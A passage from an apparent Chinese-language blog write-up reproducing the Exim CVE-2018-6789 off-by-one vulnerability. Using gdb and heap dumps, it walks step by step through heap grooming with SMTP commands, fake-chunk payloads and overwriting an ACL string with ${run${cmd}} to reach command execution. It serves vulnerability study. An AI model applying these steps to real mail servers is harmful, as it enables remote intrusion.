class="comment">#编译</span></span><br><span class="line">$make</span><br><span class="line">$sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment">#手动修改/usr/exim/configure文件中第364行的accept hosts=:为accept hosts=*</span></span><br></pre></td></tr></table></figure>
<p>安装完成后，以<a href="https://github.com/skysider/VulnPOC/blob/master/CVE-2018-6789/Environment/conf.conf" target="_blank" rel="noopener">conf.conf文件</a>作为配置文件运行exim：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$/usr/exim/bin/exim -bd -d-receive -C docker/conf.conf</span><br></pre></td></tr></table></figure>
<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>设置的断点为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b check_helo</span><br><span class="line">b smtp_reset</span><br><span class="line">b b64decode</span><br><span class="line">b store_get_3</span><br><span class="line">b store_free_3</span><br></pre></td></tr></table></figure>
<p>调试的方法是在exp里加入了raw_input辅助调试，起到让程序暂停的功能；另起一个python，用gdb.attach（pid）连上服务器端的子进程。</p>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/2.png" alt=""></p>
<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p><strong>ehlo 0x1000</strong></p>
<p>check_helo：store_malloc(0x1000)</p>
<p>smtp_reset 无</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a5e770</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a5e770</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x1a5e770</span></span><br><span class="line"><span class="number">0x1a5e770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000006061</span></span><br><span class="line"><span class="number">0x1a5e780</span>:	<span class="number">0x00007f57f47fcb78</span>	<span class="number">0x00007f57f47fcb78</span></span><br><span class="line"><span class="number">0x1a5e790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1a5e7a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x1a5e770</span><span class="number">-0x1010</span></span><br><span class="line"><span class="number">0x1a5d760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000001011</span></span><br><span class="line"><span class="number">0x1a5d770</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1a5d780</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1a5d790</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ehlo后sender_helo_name的返回的地址是0x1a5d760,后面是一个0x6060的unsortedbin</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/3.png" alt=""></p>
<p>关于这个0x6060的unsoredbin是怎么来的，是因为EHLO命令在check_helo之后还有一些其他的处理，调用了store_get，在EHLO命令结束之前调用了smtp_reset，将这些storeblock释放掉了，几个连续的storeblock合并成了这个unsoretedbin。这里简单列出几个函数，主要是match_isinlist和host_build_sender_fullhost，而且每个会重复几遍。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">46687</span>f string_copy+<span class="number">42</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">467</span>f17 string_sprintf+<span class="number">250</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">43</span>b5dd match_check_list+<span class="number">170</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">43</span>ca7d match_isinlist+<span class="number">199</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">45</span>f7ec smtp_setup_msg+<span class="number">3285</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">7</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">8</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">46687</span>f string_copy+<span class="number">42</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">467</span>f17 string_sprintf+<span class="number">250</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">4359</span>ce host_build_sender_fullhost+<span class="number">83</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">45</span>f7fe smtp_setup_msg+<span class="number">3303</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">7</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">466</span>f14 string_catn+<span class="number">97</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">435</span>bbb host_build_sender_fullhost+<span class="number">576</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">45</span>f7fe smtp_setup_msg+<span class="number">3303</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">6</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line"></span><br><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">46687</span>f string_copy+<span class="number">42</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">467</span>f17 string_sprintf+<span class="number">250</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">45</span>f9d5 smtp_setup_msg+<span class="number">3774</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">6</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">46687</span>f string_copy+<span class="number">42</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">467</span>f17 string_sprintf+<span class="number">250</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">43</span>b5dd match_check_list+<span class="number">170</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">470888</span> verify_check_this_host+<span class="number">168</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">4708</span>fb verify_check_host+<span class="number">44</span></span><br><span class="line">   f <span class="number">6</span>           <span class="number">45</span>fc4f smtp_setup_msg+<span class="number">4408</span></span><br><span class="line">   f <span class="number">7</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">8</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">9</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p>​</p>
<p><strong>ehlo 0x20</strong></p>
<p>check_helo：store_free(0x1a5d760)释放后与unsortedbin合并，即unsortedbin为0x1a5d760</p>
<p>​            store_malloc(0x30) 返回0x1a5d760，unsortedbin为0x1a5d790</p>
<p>smtp_reset  无</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a5d790</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a5d790</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/4.png" alt=""></p>
<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p><strong>unknown cmd 0x700</strong></p>
<p>在string_printing2里，为未知的命令分配了<code>4*length+1</code>的空间。这里是0x700*4+1=0x1c01，即store_get(0x1c01)。由于yield_length不够，因此在store_get_3里用store_malloc分配了一个0x2000的storeblock，是从刚才的unsoredbin中分配的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">46662</span>a string_printing2+<span class="number">136</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">45</span>c77a synprot_error+<span class="number">49</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">462284</span> smtp_setup_msg+<span class="number">14189</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">6</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line">Breakpoint store_get_3</span><br><span class="line">pwndbg&gt; i r rdi</span><br><span class="line">rdi            <span class="number">0x1c01</span>	<span class="number">7169</span></span><br><span class="line">pwndbg&gt; p yield_length</span><br><span class="line">$<span class="number">1</span> = <span class="number">7048</span></span><br><span class="line">……</span><br><span class="line">pwndbg&gt; i r rax <span class="comment">#finish之后返回值为0x1a5d7b0</span></span><br><span class="line">rax            <span class="number">0x1a5d7b0</span>	<span class="number">27645872</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a5f7b0</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a5f7b0</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/5.png" alt=""></p>
<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p><strong>ehlo 0x2c00</strong></p>
<p>check_helo：store_free(0x1a5d760)</p>
<p>​            store_malloc(0x2c00) 返回0x1a5f7b0，unsortedbin为0x1a623c0</p>
<p>smtp_reset：释放unknown cmd 0x1a5d7b0，释放时和前面的0x30合并了（中间夹杂了其他复杂的过程）变成0x1a5d760</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a623c0</span> —▸ <span class="number">0x1a68810</span> —▸ <span class="number">0x1a5d760</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a623c0</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/6.png" alt=""></p>
<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p><strong>AUTH 0X2050， off by one</strong></p>
<p>AUTH命令过程中有一些其他的store_get，但size都比较小，从原storeblock分配了。</p>
<p>客户端发送的字节长度为0x2AF7，根据前面b64decode的代码，会分配0x2AF7/4*3+1 = 0x2038字节，但实际解码时候需要0x2039字节，调用store_get(0x2038)，分配0x2050，返回地址为0x1a5d780，产生的off by one，覆盖到下一块的size最后一字节。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> ► f <span class="number">0</span>           <span class="number">465966</span> store_get_3</span><br><span class="line">   f <span class="number">1</span>           <span class="number">409</span>bf3 b64decode+<span class="number">68</span></span><br><span class="line">   f <span class="number">2</span>           <span class="number">4832</span>ff auth_cram_md5_server+<span class="number">191</span></span><br><span class="line">   f <span class="number">3</span>           <span class="number">45</span>f306 smtp_setup_msg+<span class="number">2031</span></span><br><span class="line">   f <span class="number">4</span>           <span class="number">40</span>d1d0 daemon_go+<span class="number">9509</span></span><br><span class="line">   f <span class="number">5</span>           <span class="number">4225e9</span> main+<span class="number">21198</span></span><br><span class="line">   f <span class="number">6</span>     <span class="number">7</span>f57f4458830 __libc_start_main+<span class="number">240</span></span><br><span class="line">Breakpoint store_get_3</span><br><span class="line">pwndbg&gt; i r rdi</span><br><span class="line">rdi            <span class="number">0x2038</span>	<span class="number">8248</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a623c0</span> —▸ <span class="number">0x1a68810</span> —▸ <span class="number">0x1a5d760</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a623c0</span></span><br><span class="line">……</span><br><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            <span class="number">0x1a5d780</span>	<span class="number">27645824</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x1a5d780</span><span class="number">-0x10</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x1a5d760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000002051</span></span><br><span class="line"><span class="number">0x1a5d770</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000002038</span></span><br><span class="line"><span class="number">0x1a5d780</span>:	<span class="number">0x6464646464646464</span>	<span class="number">0x6464646464646464</span></span><br><span class="line"><span class="number">0x1a5d790</span>:	<span class="number">0x6464646464646464</span>	<span class="number">0x6464646464646464</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x1a5d760</span>+<span class="number">0x2050</span> <span class="comment">#下一块大小已经被覆盖为0x2cf1</span></span><br><span class="line"><span class="number">0x1a5f7b0</span>:	<span class="number">0x1164646464646464</span>	<span class="number">0x0000000000002cf1</span></span><br><span class="line"><span class="number">0x1a5f7c0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></span><br><span class="line"><span class="number">0x1a5f7d0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></span><br><span class="line"><span class="number">0x1a5f7e0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a623c0</span> —▸ <span class="number">0x1a68810</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/7.png" alt=""></p>
<p>AUTH在b64decode之后还有一些额外的store_get（例如expand_string函数中），会重新分配一个0x2000大小的storeblock，由于0x1a68810的大小是0xb0a0虽然大于0x2000但不是last remainder，所以被丢进了largebin，于是从0x1a623c0分的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r rax</span><br><span class="line">rax            <span class="number">0x1a623e0</span>	<span class="number">27665376</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a643e0</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a643e0</span></span><br></pre></td></tr></table></figure>
<p>expand_string的一些小块就都在这个0x1a623c0中分配。</p>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/8.png" alt=""></p>
<h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p><strong>AUTH构造fake chunk</strong></p>
<p>构造fake chunk的目的在于，当0x2cf0大小的块被释放时，free会检查下一块的inuse位（确定本块是否已释放）以及下下一块的inuse（确定下一块是否空闲）</p>
<p>同上一步一样，b64decode之前有一些小块的分配，都从0x1a623c0中分配。在b64decode之前，next_yield为0x1a62430。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x6bfb80</span></span><br><span class="line"><span class="number">0x6bfb80</span> &lt;next_yield&gt;:	<span class="number">0x0000000001a62430</span>	<span class="number">0x0000000001a79118</span></span><br></pre></td></tr></table></figure>
<p>由于0x20f0的chunk地址为0x1a5f7b0，被修改之后的chunk结尾为0x1a624a0。距离next_yield 0x1a62430还有0x70的填充长度，则距离fake size为0x78的长度。</p>
<p>当AUTH发送的内容为’m’*0x78+p64(0x1f41)时，b64decode的store_get将从0x1a624a0开始分配0x80的长度，成功将假的下一块的size写为0x1f41。</p>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/9.png" alt=""></p>
<h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p><strong>ehlo skysider+</strong></p>
<p>check_helo：store_free(0x1a5f7b0)</p>
<p>这里的+会在check_helo中导致提前退出，没有store_malloc。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (yield = TRUE; *s; s++)</span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*s) &amp;&amp; *s != <span class="string">'.'</span> &amp;&amp; *s != <span class="string">'-'</span> &amp;&amp;</span><br><span class="line">          Ustrchr(helo_allow_chars, *s) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        yield = FALSE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>而在check_helo返回FALSE时，也会提前退出，没有smtp_reset</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!check_helo(smtp_cmd_data))</span><br><span class="line">     &#123;</span><br><span class="line">     smtp_printf(<span class="string">"501 Syntactically invalid %s argument(s)\r\n"</span>, FALSE, hello);</span><br><span class="line"></span><br><span class="line">     log_write(<span class="number">0</span>, LOG_MAIN|LOG_REJECT, <span class="string">"rejected %s from %s: syntactically "</span></span><br><span class="line">       <span class="string">"invalid argument(s): %s"</span>, hello, host_and_ident(FALSE),</span><br><span class="line">       (*smtp_cmd_argument == <span class="number">0</span>)? US<span class="string">"(no argument given)"</span> :</span><br><span class="line">                          string_printing(smtp_cmd_argument));</span><br><span class="line"></span><br><span class="line">     ……</span><br><span class="line"></span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a5f7b0</span> —▸ <span class="number">0x1a64470</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x1a5f7b0</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/a.png" alt=""></p>
<h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p><strong>AUTH 覆写0x1a623b0的next指针</strong></p>
<p>使用MAIL FROM时，acl_check会对每个配置进行检查，这个过程中会调用expand_string，而如果expand_string的参数为${run${cmd}}，就会执行cmd，具体调用如下：</p>
<p>acl_check-&gt;acl_check_internal-&gt;expand_string-&gt;child_open-&gt;execv</p>
<p>我们在conf.conf中指定了acl_smtp_mail=acl_check_mail。如果能够将acl_check_mail所在位置的字符串修改为${run${cmd}}形式，就能执行命令了。这里是将next指针修改为acl_check_mail地址所属的storeblock，这样在smtp_reset时会把这个storeblock放入unsortedbin，当再次分配时就能向acl_check_mail字符串地址中写入命令，完成利用。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>gx &amp;acl_smtp_mail</span><br><span class="line"><span class="number">0x6bf360</span> &lt;acl_smtp_mail&gt;:	<span class="number">0x0000000001a3e520</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6bf370</span> &lt;acl_smtp_expn&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6bf380</span> &lt;acl_smtp_data&gt;:	<span class="number">0x0000000001a3e530</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6bf390</span> &lt;acl_smtp_auth&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">……</span><br><span class="line"><span class="comment">#0x1a3e520本来是字符串"acl_check_mail",试图修改为cmd</span></span><br><span class="line"><span class="comment">#该堆块的起始头尾0x1a3e480,可将next覆写为这个地址+0x10（即为storeblock的起始地址)，能够躲过free的检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改了next指针</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x1a623c0</span></span><br><span class="line"><span class="number">0x1a623c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000002021</span></span><br><span class="line"><span class="number">0x1a623d0</span>:	<span class="number">0x0000000001a3e490</span>	<span class="number">0x0000000000002000</span></span><br><span class="line"><span class="number">0x1a623e0</span>:	<span class="number">0x0000000001a62300</span>	<span class="number">0x00000000000000c1</span></span><br><span class="line"><span class="number">0x1a623f0</span>:	<span class="number">0x00007f57f47fcb78</span>	<span class="number">0x00007f57f47fcb78</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/02/16/Exim-Off-by-one-CVE-2018-6789漏洞复现/b.png" alt=""></p>
<h2 id="Step-8"><a href="#Step-8" class="headerlink" title="Step 8"></a>Step 8</h2><p><strong>ehlo crashed</strong></p>
<p>目的在于EHLO命令结束之前的smtp_reset，会将acl_check_mail所在的storeblock释放到unsortedbin中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#reset之前的chainbase：</span></span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x6bfbc0</span></span><br><span class="line"><span class="number">0x6bfbc0</span> &lt;chainbase&gt;:	<span class="number">0x0000000001a4fa40</span>	<span class="number">0x0000000001a3e490</span></span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x0000000001a4fa40</span></span><br><span class="line"><span class="number">0x1a4fa40</span>:	<span class="number">0x0000000001a5d770</span>	<span class="number">0x0000000000002000</span></span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x0000000001a5d770</span></span><br><span class="line"><span class="number">0x1a5d770</span>:	<span class="number">0x0000000001a623d0</span>	<span class="number">0x0000000000002038</span></span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/<span class="number">8</span>gx <span class="number">0x0000000001a623d0</span></span><br><span class="line"><span class="number">0x1a623d0</span>:	<span class="number">0x0000000001a3e490</span>	<span class="number">0x0000000000002000</span></span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"><span class="comment">#即0x1a4fa40-&gt;0x1a5d770(0x2050)-&gt;0x1a623d0(0x2020)-&gt;0x1a3e490</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#reset结束后，ub为</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a72ca0</span> —▸ <span class="number">0x1a64470</span> —▸ <span class="number">0x1a43130</span> —▸ <span class="number">0x1a3e480</span> —▸ <span class="number">0x1a623c0</span> —▸ <span class="number">0x1a5d760</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>)</span><br></pre></td></tr></table></figure>
<p>​</p>
<h2 id="Step-9"><a href="#Step-9" class="headerlink" title="Step 9"></a>Step 9</h2><p>目的在于分配acl_check_mail之前的两个unsortedbin。store_get(0x1f80)，会分配一个最小的storeblock。0x1a5d760的大小为0x2050，虽然大于0x2020但并不是lastremainder，所以被扔进了largebin。结束后的ub，acl_check_mail所在的storeblock位于第一块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x1a72ca0</span> —▸ <span class="number">0x1a64470</span> —▸ <span class="number">0x1a43130</span> —▸ <span class="number">0x1a3e480</span> —▸ <span class="number">0x7f57f47fcb78</span> (main_arena+<span class="number">88</span>)</span><br></pre></td></tr></table></figure>
<p>继续通过AUTH分配掉0x1a3e480，并写入cmd</p>
